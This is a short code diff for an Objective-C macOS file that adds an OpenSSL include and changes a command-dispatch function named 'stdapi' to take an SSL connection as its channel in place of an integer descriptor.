@@ -24,10 +24,12 @@
 
 #import <Foundation/Foundation.h>
 
+#include <openssl/ssl.h>
+
 #import "generic.h"
 #import "macos/commands.h"
 
-void stdapi(int channel, char *cmd, char *args)
+void stdapi(SSL *channel, char *cmd, char *args)
 {
     Commands *commands = [[Commands alloc] init];
     commands->channelPipe = channel;
